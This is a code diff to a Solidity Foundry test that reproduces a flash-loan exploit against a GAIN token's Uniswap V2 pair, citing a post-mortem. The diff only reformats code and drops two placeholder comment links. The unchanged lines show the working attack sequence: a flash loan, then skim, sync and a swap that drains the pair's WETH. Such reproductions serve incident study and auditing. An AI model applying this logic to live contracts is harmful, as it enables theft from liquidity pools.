@@ -11,8 +11,6 @@ import "./../interface.sol";
 
 // @Analysis
 // Post-mortem : https://x.com/0xNickLFranklin/status/1760559768241160679
-// Twitter Guy : https://twitter.com/
-// Hacking God : https://www.google.com/
 
 contract ContractTest is Test {
     IWETH WETH = IWETH(payable(address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)));
@@ -43,11 +41,7 @@ contract ContractTest is Test {
         console.log("Attack Exploit: %s.%s ETH", intRes, decRes);
     }
 
-    function uniswapV3FlashCallback(
-        uint256 fee0,
-        uint256 fee1,
-        bytes memory data
-    ) external {
+    function uniswapV3FlashCallback(uint256 fee0, uint256 fee1, bytes memory data) external {
         WETH.transfer(address(univ2GAIN), totalBorrowed);
         exploitGAIN();
         WETH.transfer(address(univ3USDT), totalBorrowed + fee0);
@@ -63,7 +57,7 @@ contract ContractTest is Test {
         univ2GAIN.skim(address(this));
         univ2GAIN.sync();
         GAIN.transfer(address(univ2GAIN), 130_000_000_000_000);
-        uint leave_dust = WETH.balanceOf(address(univ2GAIN))- WETH.balanceOf(address(univ2GAIN))/100;
+        uint256 leave_dust = WETH.balanceOf(address(univ2GAIN)) - WETH.balanceOf(address(univ2GAIN)) / 100;
         univ2GAIN.swap(leave_dust, 0, address(this), "");
     }
 
